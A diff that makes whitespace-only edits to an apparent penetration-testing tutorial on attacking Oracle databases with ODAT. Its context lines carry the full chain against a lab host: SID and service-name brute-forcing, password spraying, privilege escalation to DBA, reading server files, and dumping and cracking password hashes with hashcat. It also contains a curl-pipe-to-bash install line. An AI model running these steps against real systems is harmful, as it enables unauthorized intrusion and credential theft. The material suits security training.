@@ -22,8 +22,8 @@ Here is an example where a `nmap` scan with the `-sV` flag identifies a TNS list
 ```bash
 nmap -sV oraclehost.example.com
 # ...SNIP...
-PORT     STATE SERVICE    VERSION  
-1521/tcp open  oracle-tns Oracle TNS listener 0.0.0.0.0 (unauthorized)
+PORT     STATE SERVICE    VERSION  
+1521/tcp open  oracle-tns Oracle TNS listener 0.0.0.0.0 (unauthorized)
 # ...SNIP...
 ```
 
@@ -39,7 +39,7 @@ curl https://pyenv.run | bash
 # These should go to whatever shell config you are using, i.e .zshrc for zsh, etc.
 echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
 echo 'export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
-echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\n  eval "$(pyenv init --path)"\nfi' >> ~/.bashrc
+echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\n  eval "$(pyenv init --path)"\nfi' >> ~/.bashrc
 exec $SHELL
 # Install Python 3.11.14 (latest at time of writing)
 pyenv install 3.11.14
@@ -113,20 +113,20 @@ python3 odat.py all -s 192.168.187.135 -p 1521
   
 [2] (192.168.187.135:1521): Searching valid SIDs  
 [2.1] Searching valid SIDs thanks to a well known SID list on the 192.168.187.135:1521 server  
-100% |#####################################################################################################################################################################################################################################| Time: 00:00:01    
+100% |#####################################################################################################################################################################################################################################| Time: 00:00:01    
 [2.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (192.168.187.135:1521)  
-100% |#####################################################################################################################################################################################################################################| Time: 00:00:00    
+100% |#####################################################################################################################################################################################################################################| Time: 00:00:00    
 [2.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (192.168.187.135:1521)  
-100% |#####################################################################################################################################################################################################################################| Time: 00:00:01    
+100% |#####################################################################################################################################################################################################################################| Time: 00:00:01    
 [-] No found a valid SID  
   
 [3] (192.168.187.135:1521): Searching valid Service Names  
 [3.1] Searching valid Service Names thanks to a well known Service Name list on the 192.168.187.135:1521 server  
-100% |#####################################################################################################################################################################################################################################| Time: 00:00:01    
+100% |#####################################################################################################################################################################################################################################| Time: 00:00:01    
 [3.2] Searching valid Service Names thanks to a brute-force attack on 1 chars now (192.168.187.135:1521)  
-100% |#####################################################################################################################################################################################################################################| Time: 00:00:00    
+100% |#####################################################################################################################################################################################################################################| Time: 00:00:00    
 [3.3] Searching valid Service Names thanks to a brute-force attack on 2 chars now (192.168.187.135:1521)  
-100% |#####################################################################################################################################################################################################################################| Time: 00:00:01    
+100% |#####################################################################################################################################################################################################################################| Time: 00:00:01    
 [-] No found a valid Service Name  
 [-] No one SID or Service Name has been found. Impossible to continue
 ```
@@ -136,16 +136,16 @@ Typically, admins of these resources will have a specific naming convention for 
 Here is an example of running ODAT with a custom wordlist that finds a valid `Service Name` using the `snguesser` module (`sidguesser` is the other module for `SIDs` specifically):
 
 ```bash
-python3 odat.py snguesser -s 192.168.187.135 -p 1521 --service-name-file custom_services.txt    
+python3 odat.py snguesser -s 192.168.187.135 -p 1521 --service-name-file custom_services.txt    
   
 [1] (192.168.187.135:1521): Searching valid Service Names  
 [1.1] Searching valid Service Names thanks to a well known Service Name list on the 192.168.187.135:1521 server  
-[+] 'EBSDB' is a valid Service Name. Continue...                                                                                                                                                                                           | ETA:  00:00:01    
-100% |#####################################################################################################################################################################################################################################| Time: 00:00:02    
+[+] 'EBSDB' is a valid Service Name. Continue...                                                                                                                                                                                           | ETA:  00:00:01    
+100% |#####################################################################################################################################################################################################################################| Time: 00:00:02    
 [1.2] Searching valid Service Names thanks to a brute-force attack on 1 chars now (192.168.187.135:1521)  
-100% |#####################################################################################################################################################################################################################################| Time: 00:00:00    
+100% |#####################################################################################################################################################################################################################################| Time: 00:00:00    
 [1.3] Searching valid Service Names thanks to a brute-force attack on 2 chars now (192.168.187.135:1521)  
-100% |#####################################################################################################################################################################################################################################| Time: 00:00:01    
+100% |#####################################################################################################################################################################################################################################| Time: 00:00:01    
 [+] Service Name(s) found on the 192.168.187.135:1521 server: EBSDB
 ```
 
@@ -162,19 +162,19 @@ Here is an example running with the built-in account wordlist:
 python3 odat.py passwordguesser -s 192.168.187.135 -p 1521 -n EBSDB  
   
 [1] (192.168.187.135:1521): Searching valid accounts on the 192.168.187.135 server, port 1521  
-[!] Notice: 'ad_monitor' account is locked, so skipping this username for password                                                                                                                                                         | ETA:  00:07:41    
-[!] Notice: 'anonymous' account is locked, so skipping this username for password                                                                                                                                                          | ETA:  00:07:58    
-[+] Valid credentials found: applsyspub/pub. Continue...                                                                                                                                                                                   | ETA:  00:07:44    
-[+] Valid credentials found: apps/apps. Continue...                
-[+] Valid credentials found: apps_ne/apps. Continue...             
-The login cis has already been tested at least once. What do you want to do:                                                                                                                                                               | ETA:  00:07:25    
+[!] Notice: 'ad_monitor' account is locked, so skipping this username for password                                                                                                                                                         | ETA:  00:07:41    
+[!] Notice: 'anonymous' account is locked, so skipping this username for password                                                                                                                                                          | ETA:  00:07:58    
+[+] Valid credentials found: applsyspub/pub. Continue...                                                                                                                                                                                   | ETA:  00:07:44    
+[+] Valid credentials found: apps/apps. Continue...                
+[+] Valid credentials found: apps_ne/apps. Continue...             
+The login cis has already been tested at least once. What do you want to do:                                                                                                                                                               | ETA:  00:07:25    
 - stop (s/S)  
 - continue and ask every time (a/A)  
 - skip and continue to ask (p/P)  
 - continue without to ask (c/C)  
 s  
-100% |#####################################################################################################################################################################################################################################| Time: 00:01:13    
-[+] Accounts found on 192.168.187.135:1521/ServiceName:EBSDB:    
+100% |#####################################################################################################################################################################################################################################| Time: 00:01:13    
+[+] Accounts found on 192.168.187.135:1521/ServiceName:EBSDB:    
 applsyspub/pub  
 apps/apps  
 apps_ne/apps
@@ -189,13 +189,13 @@ As seen above, something widespread in these Oracle environments is accounts hav
 Target spray with a custom list:
 
 ```bash
-python3 odat.py passwordguesser -s 192.168.187.135 -p 1521 -n EBSDB --accounts-file custom_accounts.txt    
+python3 odat.py passwordguesser -s 192.168.187.135 -p 1521 -n EBSDB --accounts-file custom_accounts.txt    
   
 [1] (192.168.187.135:1521): Searching valid accounts on the 192.168.187.135 server, port 1521  
-[+] Valid credentials found: STEPHEN_ADAMS/STEPHEN_ADAMS. Continue...                                                           ######################################                                                                     | ETA:  00:00:19    
-[!] Notice: 'xdb' account is locked, so skipping this username for password#####################################################################################################                                                           | ETA:  00:00:16    
-100% |#####################################################################################################################################################################################################################################| Time: 00:01:05    
-[+] Accounts found on 192.168.187.135:1521/ServiceName:EBSDB:    
+[+] Valid credentials found: STEPHEN_ADAMS/STEPHEN_ADAMS. Continue...                                                           ######################################                                                                     | ETA:  00:00:19    
+[!] Notice: 'xdb' account is locked, so skipping this username for password#####################################################################################################                                                           | ETA:  00:00:16    
+100% |#####################################################################################################################################################################################################################################| Time: 00:01:05    
+[+] Accounts found on 192.168.187.135:1521/ServiceName:EBSDB:    
 STEPHEN_ADAMS/STEPHEN_ADAMS
 ```
 
@@ -231,61 +231,61 @@ python3 odat.py search -s 192.168.187.135 -p 1521 -n EBSDB -U STEPHEN_ADAMS -P S
 --> Maximum failed login attemps (connection): 3
 # ...SNIP...
 --> Current user's privileges (via USER_SYS_PRIVS & no recursion on roles):  
- USERNAME            PRIVILEGE         ADMIN_OPTION   COMMON   INHERITED    
+ USERNAME            PRIVILEGE         ADMIN_OPTION   COMMON   INHERITED    
 =========================================================================  
-STEPHEN_ADAMS   CREATE SESSION          NO             NO       NO           
-PUBLIC          TEXT DATASTORE ACCESS   NO             NO       NO           
+STEPHEN_ADAMS   CREATE SESSION          NO             NO       NO           
+PUBLIC          TEXT DATASTORE ACCESS   NO             NO       NO           
   
 --> Current user's roles:  
-USERNAME   GRANTED_ROLE   ADMIN_OPTION   DELEGATE_OPTION   DEFAULT_ROLE   OS_GRANTED   COMMON   INHERITED    
+USERNAME   GRANTED_ROLE   ADMIN_OPTION   DELEGATE_OPTION   DEFAULT_ROLE   OS_GRANTED   COMMON   INHERITED    
 =========================================================================================================  
   
 --> Databases:  
-OWNER     
+OWNER     
 ======  
-SYS       
-SYSTEM    
-MGDSYS    
-CTXSYS    
-MDSYS     
-EUL_US    
-XDB       
+SYS       
+SYSTEM    
+MGDSYS    
+CTXSYS    
+MDSYS     
+EUL_US    
+XDB       
   
 --> All visible Users:  
-      USERNAME           
+      USERNAME           
 ======================  
-SYS                       
-SYSTEM                    
-OUTLN                     
-DIP                       
-XDB                       
-ORACLE_OCM                
-DBSNMP                    
-APPQOSSYS                 
-XS$NULL                   
-ANONYMOUS                 
-ORDSYS                    
-ORDDATA                   
-ORDPLUGINS                
-SI_INFORMTN_SCHEMA        
-MDSYS                     
-MDDATA                    
-INV                       
+SYS                       
+SYSTEM                    
+OUTLN                     
+DIP                       
+XDB                       
+ORACLE_OCM                
+DBSNMP                    
+APPQOSSYS                 
+XS$NULL                   
+ANONYMOUS                 
+ORDSYS                    
+ORDDATA                   
+ORDPLUGINS                
+SI_INFORMTN_SCHEMA        
+MDSYS                     
+MDDATA                    
+INV                       
 OLAPSYS
 # ...SNIP...
 --> Database options and features:  
-             PARAMETER                 VALUE    
+             PARAMETER                 VALUE    
 =============================================  
-Partitioning                            TRUE     
-Objects                                 TRUE     
-Real Application Clusters               FALSE    
-Advanced replication                    TRUE     
-Bit-mapped indexes                      TRUE     
-Connection multiplexing                 TRUE     
-Connection pooling                      TRUE     
-Database queuing                        TRUE
+Partitioning                            TRUE     
+Objects                                 TRUE     
+Real Application Clusters               FALSE    
+Advanced replication                    TRUE     
+Bit-mapped indexes                      TRUE     
+Connection multiplexing                 TRUE     
+Connection pooling                      TRUE     
+Database queuing                        TRUE
 # ...SNIP...
-Centrally Managed User                  TRUE     
+Centrally Managed User                  TRUE     
 17:53:27 WARNING -: Error with the SQL request SELECT * FROM DBA_REGISTRY: `ORA-00942: table or view does not exist`  
 --> Components loaded into the database: unknown  
 17:53:27 WARNING -: Error with the SQL request select * from dba_registry_sqlpatch: `ORA-00942: table or view does not exist`  
@@ -321,7 +321,7 @@ Here is an example run of username like password that finds a `CUSTOM_DBA` user:
 python3 odat.py userlikepwd -s 192.168.187.135 -p 1521 -n EBSDB -U STEPHEN_ADAMS -P STEPHEN_ADAMS --run  
   
 [1] (192.168.187.135:1521): Oracle users have not the password identical to the username ?  
-The login SYS has already been tested at least once. What do you want to do:                                                                                                                                                               | ETA:  --:--:--    
+The login SYS has already been tested at least once. What do you want to do:                                                                                                                                                               | ETA:  --:--:--    
 - stop (s/S)  
 - continue and ask every time (a/A)  
 - skip and continue to ask (p/P)  
@@ -330,8 +330,8 @@ c
 [!] Notice: 'APPQOSSYS' account is locked, so skipping this username for password  
 [!] Notice: 'XS$NULL' account is locked, so skipping this username for password  
 # ...SNIP...
-100% |#####################################################################################################################################################################################################################################| Time: 00:05:59    
-[+] Accounts found on 192.168.187.135:1521/ServiceName:EBSDB with usernameLikePassword module:    
+100% |#####################################################################################################################################################################################################################################| Time: 00:05:59    
+[+] Accounts found on 192.168.187.135:1521/ServiceName:EBSDB with usernameLikePassword module:    
 APPS/apps  
 RECON/recon  
 STEPHEN_ADAMS/stephen_adams  
@@ -518,8 +518,8 @@ python3 odat.py privesc -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUS
 - system privege: CREATE SESSION  
 - system privege: TEXT DATASTORE ACCESS  
 - role: CUSTOMDBA  
-       - system privege: CREATE ANY PROCEDURE   <-- exploitable  
-       - system privege: EXECUTE ANY PROCEDURE
+       - system privege: CREATE ANY PROCEDURE   <-- exploitable  
+       - system privege: EXECUTE ANY PROCEDURE
 ```
 
 >This is an example account configured with this access on purpose; usually a user named or provisioned like this would have more privileges assigned.
@@ -575,28 +575,28 @@ python3 odat.py privesc -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUS
 - system privege: TEXT DATASTORE ACCESS  
 - system privege: UNLIMITED TABLESPACE  
 - role: CUSTOMDBA  
-       - system privege: ADMINISTER ANY SQL TUNING SET  
-       - system privege: ADMINISTER DATABASE TRIGGER  
-       - system privege: ADMINISTER RESOURCE MANAGER  
-       - system privege: ADMINISTER SQL MANAGEMENT OBJECT  
-       - system privege: ADMINISTER SQL TUNING SET  
-       - system privege: ADVISOR  
-       - system privege: ALTER ANY ANALYTIC VIEW  
-       - system privege: ALTER ANY ASSEMBLY  
-       - system privege: ALTER ANY ATTRIBUTE DIMENSION
+       - system privege: ADMINISTER ANY SQL TUNING SET  
+       - system privege: ADMINISTER DATABASE TRIGGER  
+       - system privege: ADMINISTER RESOURCE MANAGER  
+       - system privege: ADMINISTER SQL MANAGEMENT OBJECT  
+       - system privege: ADMINISTER SQL TUNING SET  
+       - system privege: ADVISOR  
+       - system privege: ALTER ANY ANALYTIC VIEW  
+       - system privege: ALTER ANY ASSEMBLY  
+       - system privege: ALTER ANY ATTRIBUTE DIMENSION
 # ...SNIP...
-       - role: XDBADMIN  
-       - role: XDB_SET_INVOKER  
+       - role: XDBADMIN  
+       - role: XDB_SET_INVOKER  
 - role: DBA  
-       - system privege: ADMINISTER ANY SQL TUNING SET  
-       - system privege: ADMINISTER DATABASE TRIGGER  
-       - system privege: ADMINISTER RESOURCE MANAGER  
-       - system privege: ADMINISTER SQL MANAGEMENT OBJECT  
-       - system privege: ADMINISTER SQL TUNING SET  
-       - system privege: ADVISOR
+       - system privege: ADMINISTER ANY SQL TUNING SET  
+       - system privege: ADMINISTER DATABASE TRIGGER  
+       - system privege: ADMINISTER RESOURCE MANAGER  
+       - system privege: ADMINISTER SQL MANAGEMENT OBJECT  
+       - system privege: ADMINISTER SQL TUNING SET  
+       - system privege: ADVISOR
 # ...SNIP...
-       - role: XDBADMIN  
-       - role: XDB_SET_INVOKER
+       - role: XDBADMIN  
+       - role: XDB_SET_INVOKER
 ```
 
 We see way more permissions now, including the newly assigned `DBA` role. I usually clean things up as I go in an engagement (unless we want to leave artifacts purposely), so now would be a good time to clean up the leftover `system.odatstoredproc` procedure ODAT created to privilege escalate us:
@@ -740,24 +740,24 @@ python3 odat.py utlfile -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DBA -P CUS
   
 [1] (192.168.187.135:1521): Read the oratab file stored in /etc/ on the 192.168.187.135 server  
 [+] Data stored in the oratab file sored in /etc/ (copied in oratab.txt locally):  
-b'#\n\n\n\n# This file is used by ORACLE utilities.  It is created by root.sh\n# and updated by either Database Configuration Assistant while creating\n# a database or ASM Configuration Assistant while creating ASM instance.\n\n# A colon, \':\', is use  
-d as the field terminator.  A new line terminates\n# the entry.  Lines beginning with a pound sign, \'#\', are comments.\n#\n# Entries are of the form:\n#   $ORACLE_SID:$ORACLE_HOME:<N|Y>:\n#\n# The first and second fields are the system identifier and  
-home\n# directorse respectively.  The third field indicates\n# to the dbstart utility that the database should , "Y", or should not,\n# "N", be brought up at system boot time.\n#\n# Multiple entries with the same $ORACLE_SID are not allowed.\n#\n#\neb  
+b'#\n\n\n\n# This file is used by ORACLE utilities.  It is created by root.sh\n# and updated by either Database Configuration Assistant while creating\n# a database or ASM Configuration Assistant while creating ASM instance.\n\n# A colon, \':\', is use  
+d as the field terminator.  A new line terminates\n# the entry.  Lines beginning with a pound sign, \'#\', are comments.\n#\n# Entries are of the form:\n#   $ORACLE_SID:$ORACLE_HOME:<N|Y>:\n#\n# The first and second fields are the system identifier and  
+home\n# directorse respectively.  The third field indicates\n# to the dbstart utility that the database should , "Y", or should not,\n# "N", be brought up at system boot time.\n#\n# Multiple entries with the same $ORACLE_SID are not allowed.\n#\n#\neb  
 scdb:/u01/install/APPS/19.0.0:N\nebsdb:/u01/install/APPS/19.0.0:N\n'
 
 cat oratab.txt
-# This file is used by ORACLE utilities.  It is created by root.sh  
+# This file is used by ORACLE utilities.  It is created by root.sh  
 # and updated by either Database Configuration Assistant while creating  
 # a database or ASM Configuration Assistant while creating ASM instance.  
   
-# A colon, ':', is used as the field terminator.  A new line terminates  
-# the entry.  Lines beginning with a pound sign, '#', are comments.  
+# A colon, ':', is used as the field terminator.  A new line terminates  
+# the entry.  Lines beginning with a pound sign, '#', are comments.  
 #  
 # Entries are of the form:  
-#   $ORACLE_SID:$ORACLE_HOME:<N|Y>:  
+#   $ORACLE_SID:$ORACLE_HOME:<N|Y>:  
 #  
 # The first and second fields are the system identifier and home  
-# directorse respectively.  The third field indicates  
+# directorse respectively.  The third field indicates  
 # to the dbstart utility that the database should , "Y", or should not,  
 # "N", be brought up at system boot time.  
 #  
@@ -822,7 +822,7 @@ Now we have SSH access. At this point you could run SQL using the `SYS` account 
 SQL*Plus: Release 19.0.0.0.0 - Production on Wed Nov 26 21:17:01 2025  
 Version 19.18.0.0.0  
   
-Copyright (c) 1982, 2022, Oracle.  All rights reserved.  
+Copyright (c) 1982, 2022, Oracle.  All rights reserved.  
   
   
 Connected to:  
@@ -879,16 +879,16 @@ x00\x00\x00\x00\x00\x00ORACLE Remote Password'
 
 # Step 2: Parse the hashes out of the file, aim for the weakest hash type first. Later versions only have 11g up.
 # Trying to get 10g SYS password hash:
-xxd -c16 -g0 -s +0x0483 -l 16 pw_file.bin    
-00000483: 45313041384643463543463533464343  E10A8FCF5CF53FCC
+xxd -c16 -g0 -s +0x0483 -l 16 pw_file.bin    
+00000483: 45313041384643463543463533464343  E10A8FCF5CF53FCC
 
 # Getting the 11g salt and hash for SYS:
-xxd -c30 -g0 -s +0x04ac -l 30 pw_file.bin    
-000004ac: 000000000000000000000000000000000000000000000000000000000000  ..............................
+xxd -c30 -g0 -s +0x04ac -l 30 pw_file.bin    
+000004ac: 000000000000000000000000000000000000000000000000000000000000  ..............................
 
 # Getting the 12c SYS password hash:
-xxd -c80 -g0 -s +0x04CA -l 80 pw_file.bin    
-000004ca: 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000001f38080165e6e1db5abbaf23d76b5ebb79a09e  ..............................................................8..e...Z..#.k^.y..
+xxd -c80 -g0 -s +0x04CA -l 80 pw_file.bin    
+000004ca: 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000001f38080165e6e1db5abbaf23d76b5ebb79a09e  ..............................................................8..e...Z..#.k^.y..
 
 # So in our environment file, we can only grab the 10g
 # Step 3: Crack the hash
@@ -896,8 +896,8 @@ echo 'E10A8FCF5CF53FCC:SYS' > sys.hash
 hashcat -m 3100 sys.hash /usr/share/wordlists/rockyou.txt
 hashcat (v6.2.6) starting
 # ...SNIP...
-E10A8FCF5CF53FCC:SYS:WELCOME1!                               
-                                                            
+E10A8FCF5CF53FCC:SYS:WELCOME1!                               
+                                                            
 Session..........: hashcat  
 Status...........: Cracked  
 Hash.Mode........: 3100 (Oracle H: Type (Oracle 7+))  
@@ -940,11 +940,11 @@ python3 odat.py passwordstealer -s 192.168.187.135 -p 1521 -n EBSDB -U CUSTOM_DB
 09:31:00 INFO -: OS version from getDatabasePlatfromName(): Linux x86 64-bit  
   
 [1] (192.168.187.135:1521): Try to get Oracle hashed passwords with an ORACLE_OCM view (CVE-2020-2984)  
-09:31:00 INFO -: Trying to get hashes Oracle_OCM view    
+09:31:00 INFO -: Trying to get hashes Oracle_OCM view    
 09:31:00 INFO -: Get hashed passwords  
 [+] Here are Oracle hashed passwords (some accounts can be locked):  
-SYS; None; S:                                                            ;T:                                                                                                                                                                   
-SYSTEM;                 ; S:                                                            ;T:                                                                                                                                                                   
+SYS; None; S:                                                            ;T:                                                                                                                                                                   
+SYSTEM;                 ; S:                                                            ;T:                                                                                                                                                                   
 OUTLN; None; S:00000000000000000000000000000000000000003E7EA1F5DD44FFE0DC80;T:00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000C22B84348EFB028A1B80C07A64CBEE17  
 DIP; None; S:0000000000000000000000000000000000000000CCF2D9BEFB0966E7BA15;T:000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007A370180058FC11A3B0F47D99A49DD80  
 XDB; None; S:000000000000000000000000000000000000000064C7F48D11E59C374FBD;T:000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008C1A37AA73D75C985C6D3768F380C182  
@@ -957,7 +957,7 @@ This dumps out the hashes in three (3) different formats, raw, formatted for `jo
 Example of running `hashcat` with the dumped hashes:
 
 ```bash
-hashcat -m 3100 db_hashes.txt /usr/share/wordlists/rockyou.txt      
+hashcat -m 3100 db_hashes.txt /usr/share/wordlists/rockyou.txt      
 hashcat (v6.2.6) starting
 # ...SNIP...
 Dictionary cache hit:  
@@ -966,17 +966,17 @@ Dictionary cache hit:
 * Bytes.....: 139921507  
 * Keyspace..: 14344385  
   
-96FFB201528F5FD8:FA:PASSWORD                                 
+96FFB201528F5FD8:FA:PASSWORD                                 
 BB47045333C7A561:IA:PASSWORD
 # ...SNIP...
-5AD7E60F9FCA39A1:OKX:PASSWORD                                
-34A7408D979E4EFC:IBY:PASSWORD                                
-3F05DFD33854D413:EDGE:WELCOME                                
-1DC5850EE751ED16:RECON:RECON                                 
-764692354085670A:OO_USER:WELCOME                             
-F9DA8977092B7B81:TRACESVR:TRACE                              
-54F0C83F51B03F49:AD_MONITOR:LIZARD                           
-5BEEF0684A63B990:EM_MONITOR:LIZARD                           
+5AD7E60F9FCA39A1:OKX:PASSWORD                                
+34A7408D979E4EFC:IBY:PASSWORD                                
+3F05DFD33854D413:EDGE:WELCOME                                
+1DC5850EE751ED16:RECON:RECON                                 
+764692354085670A:OO_USER:WELCOME                             
+F9DA8977092B7B81:TRACESVR:TRACE                              
+54F0C83F51B03F49:AD_MONITOR:LIZARD                           
+5BEEF0684A63B990:EM_MONITOR:LIZARD                           
 3ADE7988A3DA908F:EBS_SYSTEM:MANAGER
 
 Session..........: hashcat  
@@ -988,7 +988,7 @@ Time.Estimated...: Thu Nov 27 03:33:19 2025 (0 secs)
 Kernel.Feature...: Optimized Kernel  
 Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)  
 Guess.Queue......: 1/1 (100.00%)  
-Speed.#1.........:   301.6 MH/s (0.13ms) @ Accel:256 Loops:1 Thr:128 Vec:1  
+Speed.#1.........:   301.6 MH/s (0.13ms) @ Accel:256 Loops:1 Thr:128 Vec:1  
 Recovered........: 172/196 (87.76%) Digests (total), 172/196 (87.76%) Digests (new), 172/196 (87.76%) Salts  
 ```
 
